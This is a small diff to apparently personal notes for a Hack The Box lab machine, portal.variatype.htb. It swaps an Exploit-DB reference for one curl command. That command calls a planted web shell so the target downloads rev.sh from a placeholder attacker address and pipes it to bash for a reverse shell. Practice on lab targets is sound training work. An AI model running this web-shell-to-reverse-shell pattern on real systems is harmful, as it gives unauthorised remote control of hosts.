@@ -20,9 +20,4 @@ portal.variatype.htb
 
 Reference: `VT-VALID-2.1.4` 
 
-found some CVE:
-
-```
-https://www.exploit-db.com/exploits/49757
-
-```
+curl -s “[http://portal.variatype.htb/files/shell.php?cmd=curl+YOUR_IP:8080/rev.sh](http://portal.variatype.htb/files/shell.php?cmd=curl+YOUR_IP:8080/rev.sh)|bash”
